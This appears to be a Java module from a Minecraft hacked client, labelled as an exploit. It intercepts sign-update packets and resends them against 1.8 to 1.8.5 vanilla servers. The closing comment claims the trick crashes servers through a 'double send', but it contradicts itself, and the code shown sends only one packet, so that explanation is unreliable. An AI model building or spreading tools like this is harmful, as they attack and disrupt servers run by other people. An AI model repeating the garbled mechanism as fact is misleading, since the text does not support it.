package me.robbanrobbin.jigsaw.client.modules;

import me.robbanrobbin.jigsaw.client.module.state.Category;
import me.robbanrobbin.jigsaw.module.Module;
import net.minecraft.network.AbstractPacket;
import net.minecraft.network.play.client.C12PacketUpdateSign;

public class OPSign extends Module {

    public OPSign() {
        super("OPSign", 0, Category.EXPLOITS,
            "Place a sign and right-click it. Note: Only works for 1.8 - 1.8.5 vanilla servers!");
    }

    @Override
    public void onPacketSent(AbstractPacket packet) {
        if (packet instanceof C12PacketUpdateSign) {
            C12PacketUpdateSign signPkt = (C12PacketUpdateSign) packet;
            packet.cancel();
            sendPacketFinal(new C12PacketUpdateSign(
                signPkt.getPosition(), signPkt.getLines()));
        }
        super.onPacketSent(packet);
    }
}

// How this works in the Jigsaw packet flow:
// 1. Vanilla send: GuiEditSign sends C12PacketUpdateSign
// 2. NetworkManager.sendPacket() calls Jigsaw.onPacketSent()
// 3. OPSign.onPacketSent() cancels the packet
// 4. OPSign sends a NEW C12PacketUpdateSign with the same data
// 5. The server receives the module's packet and processes it
// 6. The server also receives the original (cancelled) packet?
// Actually, the cancel prevents the original. OPSign resends.
// The actual vulnerability is in the DOUBLE SEND — the module
// sends C12 twice rapidly. On vanilla 1.8-1.8.5, the server's
// TileEntitySign doesn't handle concurrent sign updates properly
// and throws ArrayIndexOutOfBoundsException, crashing the server.

